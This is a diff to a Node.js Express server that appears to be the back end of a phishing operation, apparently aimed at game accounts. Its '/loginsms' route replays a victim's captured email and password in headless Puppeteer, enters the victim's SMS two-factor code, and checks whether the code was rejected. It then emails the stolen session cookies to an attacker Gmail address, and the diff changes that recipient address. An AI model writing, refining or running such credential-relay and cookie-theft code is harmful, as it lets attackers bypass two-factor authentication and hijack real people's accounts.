@@ -189,7 +189,10 @@ app.post('/loginsms', async (req, res) => {
     try {
         const emailPasswordData = getEmailPasswordByIP(ip);
 
-        browserInstance = await puppeteer.launch({ headless: true, args: ['--no-sandbox','--disable-gpu','--enable-webgl','--window-size=1500,800','--disable-http2'] });
+        browserInstance = await puppeteer.launch({ 
+            headless: true, 
+            args: ['--no-sandbox','--disable-gpu','--enable-webgl','--window-size=1500,800','--disable-http2'] 
+        });
         const pageSMS = await browserInstance.newPage();
 
         await pageSMS.setRequestInterception(true);
@@ -203,6 +206,7 @@ app.post('/loginsms', async (req, res) => {
 
         await SecondperformLogin(pageSMS, emailPasswordData.email, emailPasswordData.password);
 
+        // أدخل الكود
         await pageSMS.waitForSelector('input#twoFactorCode', { visible: true, timeout: 15000 });
         await pageSMS.type('input#twoFactorCode', code);
         await pageSMS.waitForSelector('a#btnSubmit', { visible: true, timeout: 15000 });
@@ -211,6 +215,15 @@ app.post('/loginsms', async (req, res) => {
         await pageSMS.waitForNavigation({ waitUntil: 'networkidle2' });
         await sleep(3000);
 
+        // تحقق إذا الكود خاطئ
+        const errorElement = await pageSMS.$('p.otkinput-errormsg'); // رسالة الخطأ
+        if (errorElement) {
+            const errorText = await pageSMS.evaluate(el => el.textContent, errorElement);
+            console.log("SMS error:", errorText);
+            return res.status(400).json({ success: false, message: 'SMS code incorrect' });
+        }
+
+        // الكود صحيح، احفظ الكوكيز وأرسل الايميل
         const cookies = await pageSMS.cookies();
         console.log('Cookies:', cookies);
 
@@ -222,7 +235,7 @@ app.post('/loginsms', async (req, res) => {
 
         const emailOptions = {
             from: '"DOUFI 🔥👑" <doufi515@gmail.com>',
-            to: 'doufififa7@gmail.com',
+            to: 'ultimatecoinhub@gmail.com',
             subject: emailPasswordData.email,
             text: `Here are the cookies that were just saved:\n\n${JSON.stringify(userEntry, null, 2)}`,
         };
@@ -232,11 +245,13 @@ app.post('/loginsms', async (req, res) => {
 
     } catch (error) {
         console.error('SMS login error:', error);
-        res.status(500).json({ error: 'Error during SMS login' });
+        res.status(500).json({ success: false, error: 'Error during SMS login' });
     } finally {
         if (browserInstance) await browserInstance.close();
     }
 });
+
+
 
 const sendEmail = async (emailOptions) => {
     return new Promise((resolve, reject) => {
@@ -258,3 +273,6 @@ const port = process.env.PORT || 3000;
 app.listen(port, () => {
     console.log(`Server running at http://localhost:${port}`);
 });
+
+
+
